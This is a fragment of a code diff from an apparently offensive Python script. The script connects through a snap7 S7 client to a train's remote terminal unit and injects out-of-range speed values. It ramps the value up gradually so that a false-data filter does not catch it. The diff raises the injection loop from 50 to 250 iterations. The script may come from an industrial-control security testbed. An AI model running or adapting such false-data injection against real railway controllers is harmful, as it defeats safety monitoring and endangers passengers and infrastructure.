@@ -53,7 +53,7 @@ client = snap7Comm.s7CommClient(RTU_ANTENNA_IP, rtuPort=RADIO_FREQUEnCY, snapLib
 connection = client.checkConn()
 initSpeed = 75
 if connection:
-    for i in range(50):
+    for i in range(250):
         initSpeed += 10 # increase speed to avoid the false data filter activate.
         initSpeed = min(initSpeed, 200)
         print("Attack: Start inject out of range speed value = %s km to the train RTU " %str(initSpeed))
